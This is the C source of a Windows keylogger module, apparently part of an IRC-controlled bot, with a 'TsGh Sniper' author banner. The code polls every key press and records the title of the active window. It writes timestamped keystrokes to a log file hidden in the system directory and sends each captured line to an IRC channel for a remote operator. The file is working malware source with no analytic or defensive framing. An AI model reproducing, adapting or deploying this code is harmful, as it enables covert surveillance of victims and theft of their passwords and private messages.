/////////////////////////////////////////
///                                   ///
///  TsGh By TsGh Sniper              ///
///                                   ///
/////////////////////////////////////////


#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_KEYLOG

KEYS keys[]={
	{8,"b","b"},
	{13,"e","e"},
	{27,"[ESC]","[ESC]"},
	{112,"[F1]","[F1]"},
	{113,"[F2]","[F2]"},
	{114,"[F3]","[F3]"},
	{115,"[F4]","[F4]"},
	{116,"[F5]","[F5]"},
	{117,"[F6]","[F6]"},
	{118,"[F7]","[F7]"},
	{119,"[F8]","[F8]"},
	{120,"[F9]","[F9]"},
	{121,"[F10]","[F10]"},
	{122,"[F11]","[F11]"},
	{123,"[F12]","[F12]"},
	{192,"`","~"},
	{49,"1","!"},
	{50,"2","@"},
	{51,"3","#"},
	{52,"4","$"},
	{53,"5","%"},
	{54,"6","^"},
	{55,"7","&"},
	{56,"8","*"},
	{57,"9","("},
	{48,"0",")"},
	{189,"-","_"},
	{187,"=","+"},
	{9,"[TAB]","[TAB]"},
	{81,"q","Q"},
	{87,"w","W"},
	{69,"e","E"},
	{82,"r","R"},
	{84,"t","T"},
	{89,"y","Y"},
	{85,"u","U"},
	{73,"i","I"},
	{79,"o","O"},
	{80,"p","P"},
	{219,"[","{"},
	{221,"","}"},
	{65,"a","a"},
	{83,"s","S"},
	{68,"d","D"},
	{70,"f","F"},
	{71,"g","G"},
	{72,"h","H"},
	{74,"j","J"},
	{75,"k","K"},
	{76,"l","L"},
	{186,";",":"},
	{222,"'","\""},
	{90,"z","Z"},
	{88,"x","X"},
	{67,"c","C"},
	{86,"v","V"},
	{66,"b","B"},
	{78,"n","N"},
	{77,"m","M"},
	{188,",","<"},
	{190,".",">"},
	{191,"/",".?"},
	{220,"\\","|"},
	{17,"[CTRL]","[CTRL]"},
	{91,"[WIN]","[WIN]"},
	{32," "," "},
	{92,"[WIN]","[WIN]"},
	{44,"[PRSC]","[PRSC]"},
	{145,"[SCLK]","[SCLK]"},
	{45,"[INS]","[INS]"},
	{36,"[HOME]","[HOME]"},
	{33,"[PGUP]","[PGUP]"},
	{46,"[DEL]","[DEL]"},
	{35,"[END]","[END]"},
	{34,"[PGDN]","[PGDN]"},
	{37,"[LEFT]","[LEFT]"},
	{38,"[UP]","[UP]"},
	{39,"[RGHT]","[RGHT]"},
	{40,"[DOWN]","[DOWN]"},
	{144,"[NMLK]","[NMLK]"},
	{111,"/","/"},
	{106,"*","*"},
	{109,"-","-"},
	{107,"+","+"},
	{96,"0","0"},
	{97,"1","1"},
	{98,"2","2"},
	{99,"3","3"},
	{100,"4","4"},
	{101,"5","5"},
	{102,"6","6"},
	{103,"7","7"},
	{104,"8","8"},
	{105,"9","9"},
	{110,".","."}
};

int SaveKeys(char *key, KEYLOG keylog)
{
	char file[MAX_PATH], sendbuf[IRCLINE];

	SYSTEMTIME st;
	GetLocalTime(&st);

	GetSystemDirectory(file,sizeof(file));
	strcat(file,"\\");
	strcat(file,keylogfile);

	FILE *fp = fopen(file,"ab");
	if (fp == NULL) 
		return 1;

	fprintf(fp, "[%d-%d-%d %d:%d:%d] %s\r\n", st.wMonth, st.wDay, st.wYear, st.wHour, st.wMinute, st.wSecond, key);	
	fclose(fp);

	if (!keylog.silent) {
		_snprintf(sendbuf,sizeof(sendbuf),"[KEYLOG]: %s", key);
		irc_privmsg(keylog.sock,keylog.chan,sendbuf,keylog.notice);
	}

	return 0;
}

DWORD WINAPI KeyLoggerThread(LPVOID param)
{
	KEYLOG keylog = *((KEYLOG *)param);
	KEYLOG *keylogs = (KEYLOG *)param;
	keylogs->gotinfo = TRUE;

	char buffer[IRCLINE], buffer2[IRCLINE], windowtxt[61];

	int err = 0, x = 0, i = 0, state, shift, bKstate[256]={0};

	HWND active = fGetForegroundWindow();
	HWND old = active;
	fGetWindowText(old,windowtxt,60);

	while (err == 0) {
		Sleep(8);

		active = fGetForegroundWindow();
		if (active != old) {
			old = active;
			fGetWindowText(old,windowtxt,60);

			sprintf(buffer2, "%s (Changed Windows: %s)", buffer, windowtxt); 
			err = SaveKeys(buffer2, keylog);
			memset(buffer,0,sizeof(buffer));
			memset(buffer2,0,sizeof(buffer2));
		}

		for (i = 0; i < 92; i++) {
			shift = fGetKeyState(VK_SHIFT);

			x = keys[i].inputL;

			if (fGetAsyncKeyState(x) & 0x8000) {
				if (((fGetKeyState(VK_CAPITAL)) && (shift > -1) && (x > 64) && (x < 91)))//caps lock and NOT shift
					bKstate[x] = 1; /* upercase a-z */
				else if (((fGetKeyState(VK_CAPITAL)) && (shift < 0) && (x > 64) && (x < 91)))//caps lock AND shift
					bKstate[x] = 2; /* lowercase a-z */
				else if (shift < 0) /* shift */
					bKstate[x] = 3; /* upercase */
				else bKstate[x] = 4; /* lowercase */
			} else {
				if (bKstate[x] != 0) {
					state = bKstate[x];
					bKstate[x] = 0;
	
					if (x == 8) {
						buffer[strlen(buffer)-1] = 0;
						continue;
					} else if (strlen(buffer) > 511 - 70) {
						active = fGetForegroundWindow();
						fGetWindowText(active,windowtxt,60);
					
						sprintf(buffer2,"%s (Buffer full) (%s)",buffer,windowtxt);
						err = SaveKeys(buffer2, keylog);
						memset(buffer,0,sizeof(buffer));
						memset(buffer2,0,sizeof(buffer2));

						continue;
					} else if (x == 13) {
						if (strlen(buffer) == 0) 
							continue;

						active = fGetForegroundWindow();
						fGetWindowText(active,windowtxt,60);

						sprintf(buffer2,"%s (Return) (%s)",buffer,windowtxt);
						err = SaveKeys(buffer2,keylog);
						memset(buffer,0,sizeof(buffer));
						memset(buffer2,0,sizeof(buffer2));

						continue;
					} else if (state == 1 || state == 3) 
						strcat(buffer,keys[i].outputH);
					else if (state == 2 || state == 4) 
						strcat(buffer,keys[i].outputL);
				}
			}
		}
	}
	clearthread(keylog.threadnum);

	ExitThread(0);
}
#endif
